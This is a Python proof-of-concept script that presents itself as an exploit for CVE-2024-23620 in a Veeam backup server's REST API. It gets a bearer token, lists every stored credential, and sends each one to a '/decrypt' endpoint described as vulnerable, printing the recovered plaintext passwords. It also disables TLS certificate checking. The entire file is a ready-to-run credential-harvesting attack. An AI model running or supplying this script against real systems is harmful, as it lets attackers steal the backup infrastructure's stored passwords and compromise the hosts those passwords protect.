import requests
import json
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# === CONFIGURATION ===
VEEAM_URL = "https://veeam-server:9398/api/v1"  # Default port
USERNAME = "labuser"
PASSWORD = "P@ssw0rd!"
VERIFY_SSL = False  # Warning: Only for testing! Use True in production

# === Step 1: Obtain Bearer Token ===
def get_token():
    url = f"{VEEAM_URL}/token"
    data = {
        "grant_type": "password",
        "username": USERNAME,
        "password": PASSWORD
    }
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    
    try:
        response = requests.post(url, data=data, headers=headers, verify=VERIFY_SSL, timeout=10)
        response.raise_for_status()
        token_data = response.json()
        return token_data.get("access_token")
    except requests.exceptions.RequestException as e:
        print(f"[-] Failed to get token: {e}")
        exit(1)
    except (KeyError, json.JSONDecodeError):
        print("[-] Invalid response when fetching token.")
        exit(1)

# === Step 2: Retrieve all credentials ===
def get_all_creds(token):
    url = f"{VEEAM_URL}/credentials"
    headers = {"Authorization": f"Bearer {token}"}
    
    try:
        response = requests.get(url, headers=headers, verify=VERIFY_SSL, timeout=10)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"[-] Failed to retrieve credentials: {e}")
        return {"data": []}
    except json.JSONDecodeError:
        print("[-] Invalid JSON response when fetching credentials.")
        return {"data": []}

# === Step 3: Decrypt password via vulnerable endpoint ===
def decrypt_password(token, cred_id):
    url = f"{VEEAM_URL}/credentials/{cred_id}/decrypt"
    headers = {"Authorization": f"Bearer {token}"}
    
    try:
        response = requests.post(url, headers=headers, verify=VERIFY_SSL, timeout=10)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        return {"error": str(e)}
    except json.JSONDecodeError:
        return {"error": "Invalid JSON in decrypt response"}

# === Main execution ===
if __name__ == "__main__":
    print("[+] Starting PoC for CVE-2024-23620")
    
    # Get authentication token
    token = get_token()
    if not token:
        print("[-] Could not obtain access token. Exiting.")
        exit(1)
    
    print(f"[+] Token obtained: {token[:50]}...")

    # Fetch all credentials
    creds_data = get_all_creds(token)
    credentials = creds_data.get("data", [])
    
    if not credentials:
        print("[!] No credentials found or error occurred.")
        exit(0)

    print(f"[+] Found {len(credentials)} credential(s). Attempting decryption...")

    # Try to decrypt each credential
    for cred in credentials:
        name = cred.get("name", "Unknown")
        cred_id = cred.get("id")
        if not cred_id:
            print(f"[!] Skipping credential '{name}': missing ID")
            continue
        
        print(f"[*] Attempting to decrypt: {name} ({cred_id})")
        
        decrypted = decrypt_password(token, cred_id)
        if "error" in decrypted:
            print(f" → Failed: {decrypted['error']}")
            print("    (Note: This may indicate the system is patched or access is denied)")
        else:
            password = decrypted.get("password", "N/A")
            print(f" → Password: {password}")
